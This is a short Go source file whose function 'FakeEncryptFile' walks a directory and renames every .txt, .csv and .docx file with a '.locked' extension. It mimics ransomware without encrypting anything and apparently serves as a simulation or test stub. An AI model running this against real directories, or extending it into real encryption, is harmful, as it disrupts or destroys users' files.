package crypto

import (
	"os"
	"path/filepath"
)

func FakeEncryptFile(targetDir string) error {
	return filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error{
		if err != nil || info.IsDir() {
			return nil
		}
		ext := filepath.Ext(path)
		if ext == ".txt" || ext == ".csv" || ext == ".docx" {
			newName := path + ".locked"
			return os.Rename(path, newName)
		}
		return nil
	})
}